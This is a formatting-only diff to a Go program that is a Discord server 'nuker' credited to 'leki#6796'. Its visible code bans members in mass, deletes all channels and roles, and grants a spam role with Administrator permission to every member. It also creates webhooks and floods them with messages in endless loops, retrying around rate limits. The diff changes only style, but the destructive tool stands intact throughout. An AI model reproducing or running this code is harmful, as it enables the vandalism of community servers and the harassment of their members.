@@ -2,20 +2,21 @@ package main
 
 import (
 	"bufio"
-	"github.com/bengadbois/flippytext"
-	"github.com/bwmarrin/discordgo"
-	"github.com/gookit/color"
 	"log"
 	"math/rand"
 	"net/http"
 	"os"
 	"strings"
 	"time"
+
+	"github.com/bengadbois/flippytext"
+	"github.com/bwmarrin/discordgo"
+	"github.com/gookit/color"
 )
 
 func (h *How) Menu(dg *discordgo.Session) {
-	restart:
-		color.Info.Println(`
+restart:
+	color.Info.Println(`
 			__ __   ___   __    __        
 			|  |  | /   \ |  |__|  |       
 			|  |  ||     ||  |  |  |       
@@ -23,7 +24,8 @@ func (h *How) Menu(dg *discordgo.Session) {
 			|  |  ||     ||  '  '  |__  __ 
 			|  |  ||     | \      /|  ||  |
 			|__|__| \___/   \_/\_/ |__||__|
-			`);flippytext.New().Write(`			Made by leki#6796`)
+			`)
+	flippytext.New().Write(`			Made by leki#6796`)
 	color.Info.Println(`
 	[	[1] - How to use    [2] - Nuke    [3] - Ban all    [4] - Delete roles   ]
 	[   [5] - Delete roles  [6] - Delete channels    [7] Spam roles ]
@@ -90,7 +92,7 @@ func (h *How) Menu(dg *discordgo.Session) {
 			go DeleteRoles(dg, guildz)
 			go SpamRoles(dg, guildz)
 		}
-	}else if strings.HasPrefix(text, "7") {
+	} else if strings.HasPrefix(text, "7") {
 		color.Question.Tips("What guild are you trying to spam roles in?")
 		guilds := dg.State.Guilds
 		for _, guild := range guilds {
@@ -116,7 +118,7 @@ func (h *How) Menu(dg *discordgo.Session) {
 			go SpamRoles(dg, guildz)
 		}
 
-	}else if strings.HasPrefix(text, "3") {
+	} else if strings.HasPrefix(text, "3") {
 		color.Question.Tips("What guild are you trying to ban all in?")
 		guilds := dg.State.Guilds
 		for _, guild := range guilds {
@@ -137,14 +139,14 @@ func (h *How) Menu(dg *discordgo.Session) {
 
 			go h.BanAll(dg, guildz)
 		}
-	}else if strings.HasPrefix(text, "6") {
+	} else if strings.HasPrefix(text, "6") {
 		color.Question.Tips("What guild are you trying to delete all channels in?")
 		guilds := dg.State.Guilds
 		for _, guild := range guilds {
 			color.Info.Tips(guild.Name)
 		}
 		ch, _ := bufio.NewReader(os.Stdin).ReadString('\n')
-		
+
 		var guildz *discordgo.Guild
 		for i, guild := range guilds {
 			if guild.Name[:1] == ch[:1] {
@@ -155,10 +157,10 @@ func (h *How) Menu(dg *discordgo.Session) {
 			}
 		}
 		for i := 0; i < 250; i++ {
-			
+
 			go h.DeleteChannels(dg, guildz)
 		}
-		
+
 	}
 }
 func SpamRoles(dg *discordgo.Session, guild *discordgo.Guild) {
@@ -167,19 +169,19 @@ func SpamRoles(dg *discordgo.Session, guild *discordgo.Guild) {
 		if err != nil {
 			color.Error.Tips("Error creating role", err)
 		}
-		color.Success.Tips("Created role successfully "+create.Name)
+		color.Success.Tips("Created role successfully " + create.Name)
 		_, err = dg.GuildRoleEdit(guild.ID, create.ID, "leki was here", 16711680, false, discordgo.PermissionAdministrator, false)
-		color.Success.Tips("Edited role successfully "+ create.Name)
+		color.Success.Tips("Edited role successfully " + create.Name)
 
 		if err != nil {
 			color.Error.Tips("Error creating role", err)
 		}
-		for _,v := range guild.Members {
+		for _, v := range guild.Members {
 			err1 := dg.GuildMemberRoleAdd(guild.ID, v.User.ID, create.ID)
 			if err1 != nil {
 				color.Error.Tips("Error creating role", err)
 			}
-			color.Success.Tips("Success gave "+v.User.Username+" role of "+create.Name)
+			color.Success.Tips("Success gave " + v.User.Username + " role of " + create.Name)
 		}
 
 	}
@@ -190,24 +192,24 @@ loop:
 		roleID := guild.Roles[rand.Intn(len(guild.Roles))]
 		if role.ID != guild.ID {
 			if role.Name == "leki was here" {
-				color.Warn.Tips("Unable to delete whitelisted role. "+role.Name)
+				color.Warn.Tips("Unable to delete whitelisted role. " + role.Name)
 				goto loop
-			}else{
+			} else {
 				err := dg.GuildRoleDelete(guild.ID, roleID.ID)
 				if err != nil {
 					if strings.Contains(err.Error(), "404") {
 						goto loop
 					}
-					color.Error.Tips("Ratelimited "+err.Error())
+					color.Error.Tips("Ratelimited " + err.Error())
 					goto loop
 				}
-				color.Success.Tips("Successfully deleted role "+roleID.Name)
+				color.Success.Tips("Successfully deleted role " + roleID.Name)
 			}
 
 		}
 	}
 }
-func (h *How) DeleteChannels(dg *discordgo.Session, guild *discordgo.Guild) {
+func (*How) DeleteChannels(dg *discordgo.Session, guild *discordgo.Guild) {
 loop:
 	for _, channel := range guild.Channels {
 		_, err := dg.ChannelDelete(channel.ID)
@@ -215,15 +217,15 @@ loop:
 			if strings.Contains(err.Error(), "404") {
 				color.Error.Tips("Channel not found")
 				goto loop
-			}else{
-				color.Error.Tips("Ratelimited "+err.Error())
+			} else {
+				color.Error.Tips("Ratelimited " + err.Error())
 				goto loop
 			}
 		} else {
-			color.Success.Tips("Deleted channel "+channel.Name)
+			color.Success.Tips("Deleted channel " + channel.Name)
 		}
 	}
-	
+
 }
 
 var webhooks []string
@@ -239,11 +241,10 @@ func (h *How) CreateChannels(dg *discordgo.Session, guildID string, channelName 
 		hook, err := dg.WebhookCreate(channel.ID, "How-to-code-i-forgor", "https://i.ytimg.com/vi/DqZZRGXuHF8/maxresdefault.jpg")
 		if err != nil {
 			color.Error.Tips(err.Error())
-		}else{
+		} else {
 			color.Success.Tips("Created channel & webhook", channelName, "https://discord.com/api/webhooks/"+hook.ID+"/"+hook.Token)
 			webhooks = append(webhooks, "https://discord.com/api/webhooks/"+hook.ID+"/"+hook.Token)
-			
-			
+
 			go func() {
 				for {
 					randomIndex := rand.Intn(len(webhooks))
@@ -253,7 +254,7 @@ func (h *How) CreateChannels(dg *discordgo.Session, guildID string, channelName 
 					}
 					if req.StatusCode == http.StatusOK {
 						color.Success.Tips("Sent message to webhook successfully", webhooks[randomIndex])
-					}else{
+					} else {
 						color.Error.Tips(req.Status)
 					}
 				}
@@ -267,12 +268,12 @@ func (h *How) BanAll(dg *discordgo.Session, guild *discordgo.Guild) {
 	log.Println(h.Whitelisted)
 	for {
 	loop:
-	for _, member := range guild.Members {
+		for _, member := range guild.Members {
 			randomIndex := rand.Intn(len(guild.Members))
 			if member.User.ID != h.Whitelisted.(string) || member.User.ID != dg.State.User.ID {
 				if member.Permissions == discordgo.PermissionAdministrator {
 					color.Warn.Tips("Cannot ban an administrator")
-				}else{
+				} else {
 					color.Notice.Tips("Attempting to ban "+guild.Members[randomIndex].User.Username, "neon")
 					err := dg.GuildBanCreate(guild.ID, guild.Members[randomIndex].User.ID, 7)
 					if err != nil {
